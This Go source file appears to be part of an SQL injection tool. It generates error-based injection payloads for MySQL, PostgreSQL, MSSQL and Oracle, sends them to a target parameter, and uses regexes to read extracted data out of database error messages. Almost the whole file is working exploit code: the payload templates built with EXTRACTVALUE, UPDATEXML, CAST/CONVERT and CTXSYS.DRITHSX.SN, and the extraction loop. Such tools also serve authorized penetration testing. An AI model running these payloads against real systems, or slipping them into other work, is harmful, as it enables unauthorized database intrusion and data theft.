package modules

import (
	"fmt"
	"regexp"
	"strings"
	"hackit/sqli/go/utils"
)

// ErrorEngine performs extensive error-based SQL injection extraction
type ErrorEngine struct {
	engine EngineInterface
	log    *utils.Logger
}

// ErrorPattern defines a DBMS-specific error pattern
type ErrorPattern struct {
	DBMS    string
	Pattern *regexp.Regexp
	Extract func(string) string
}

func NewErrorEngine(e EngineInterface) *ErrorEngine {
	return &ErrorEngine{engine: e, log: e.GetLogger()}
}

// ErrorPayload generates error-based payloads
func (ee *ErrorEngine) ErrorPayload(dbms, extractQuery string) []string {
	switch {
	case strings.Contains(dbms, "MySQL"), strings.Contains(dbms, "MariaDB"):
		return []string{
			fmt.Sprintf("' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT %s), FLOOR(RAND()*2)) x FROM INFORMATION_SCHEMA.TABLES GROUP BY x) y)-- -", extractQuery),
			fmt.Sprintf("' OR (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT %s), FLOOR(RAND()*2)) x FROM INFORMATION_SCHEMA.TABLES GROUP BY x) y)-- -", extractQuery),
			fmt.Sprintf("' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT %s)))-- -", extractQuery),
			fmt.Sprintf("' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT %s)))-- -", extractQuery),
			fmt.Sprintf("' AND UPDATEXML(1, CONCAT(0x7e, (SELECT %s)), 1)-- -", extractQuery),
			fmt.Sprintf("' OR UPDATEXML(1, CONCAT(0x7e, (SELECT %s)), 1)-- -", extractQuery),
		}
	case strings.Contains(dbms, "PostgreSQL"):
		return []string{
			fmt.Sprintf("' AND CAST((SELECT %s) AS INTEGER)-- -", extractQuery),
			fmt.Sprintf("' OR CAST((SELECT %s) AS INTEGER)-- -", extractQuery),
			fmt.Sprintf("' AND (SELECT %s)::INTEGER-- -", extractQuery),
		}
	case strings.Contains(dbms, "MSSQL"):
		return []string{
			fmt.Sprintf("' AND CONVERT(INT, (SELECT %s))-- -", extractQuery),
			fmt.Sprintf("' OR CONVERT(INT, (SELECT %s))-- -", extractQuery),
			fmt.Sprintf("' AND CAST((SELECT %s) AS INT)-- -", extractQuery),
		}
	case strings.Contains(dbms, "Oracle"):
		return []string{
			fmt.Sprintf("' AND CTXSYS.DRITHSX.SN(1, (SELECT %s FROM DUAL))-- -", extractQuery),
			fmt.Sprintf("' OR CTXSYS.DRITHSX.SN(1, (SELECT %s FROM DUAL))-- -", extractQuery),
		}
	}
	return []string{
		fmt.Sprintf("' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT %s), FLOOR(RAND()*2)) x FROM INFORMATION_SCHEMA.TABLES GROUP BY x) y)-- -", extractQuery),
	}
}

// ExtractViaError extracts data using error messages
func (ee *ErrorEngine) ExtractViaError(param, dbms, extractQuery string) (string, float64) {
	payloads := ee.ErrorPayload(dbms, extractQuery)
	bestResult := ""
	bestConfidence := 0.0

	for _, payload := range payloads {
		body, _, _, err := ee.engine.Request(payload, param)
		if err != nil {
			continue
		}

		// Extract data from error messages using various patterns
		patterns := []*regexp.Regexp{
			regexp.MustCompile(`Duplicate entry '([^']+)'`),
			regexp.MustCompile(`~([^~]+)~`),
			regexp.MustCompile(`XPATH syntax error: '([^']+)'`),
			regexp.MustCompile(`Error: ([^\n]+)`),
			regexp.MustCompile(`SQL error.*?['"]([^'"]+)['"]`),
			regexp.MustCompile(`\[SQL\]\s*(.+?)[\r\n]`),
		}

		for _, pat := range patterns {
			matches := pat.FindStringSubmatch(body)
			if len(matches) > 1 {
				data := strings.TrimSpace(matches[1])
				if len(data) > 0 && len(data) < 200 && !strings.Contains(data, "error") {
					if len(data) > len(bestResult) {
						bestResult = data
						bestConfidence = 0.9
					}
				}
			}
		}
	}

	return bestResult, bestConfidence
}

// ExtractErrorPatterns returns all known error-based extraction patterns
func (ee *ErrorEngine) ExtractErrorPatterns() map[string][]string {
	return map[string][]string{
		"MySQL": {
			"Duplicate entry '",
			"XPATH syntax error: '",
			"from INFORMATION_SCHEMA.TABLES GROUP BY x)",
			"EXTRACTVALUE(1, CONCAT(0x7e,",
		},
		"PostgreSQL": {
			"CAST(",
			"::INTEGER",
			"malformed integer",
		},
		"MSSQL": {
			"CONVERT(INT,",
			"CAST(",
			"Conversion failed",
		},
		"Oracle": {
			"DRITHSX.SN",
			"CTXSYS",
		},
	}
}

// CheckErrorInResponse checks if response contains error-based data
func (ee *ErrorEngine) CheckErrorInResponse(body string) (bool, string) {
	patterns := []*regexp.Regexp{
		regexp.MustCompile(`Duplicate entry '([^']+)' for key`),
		regexp.MustCompile(`SQL syntax.*?MySQL`),
		regexp.MustCompile(`Warning.*?mysql_`),
		regexp.MustCompile(`Microsoft OLE DB.*?SQL Server`),
		regexp.MustCompile(`Unclosed quotation mark`),
		regexp.MustCompile(`PostgreSQL.*?ERROR`),
		regexp.MustCompile(`ORA-[0-9]{5}`),
		regexp.MustCompile(`SQLite/JDBCDriver`),
		regexp.MustCompile(`SQL logic error`),
		regexp.MustCompile(`driver.*?SQLite`),
	}

	for _, pat := range patterns {
		matches := pat.FindStringSubmatch(body)
		if len(matches) > 1 {
			return true, matches[1]
		}
	}
	return false, ""
}

// ErrorToCore formats extraction results
func (ee *ErrorEngine) ErrorToCore(param, data, dbms string, confidence float64) Result {
	return Result{
		Parameter:  param,
		Type:       "Error-based",
		Payload:    data,
		DBMS:       dbms,
		Details:    fmt.Sprintf("Extracted via error: %s", data),
		Confidence: confidence,
	}
}
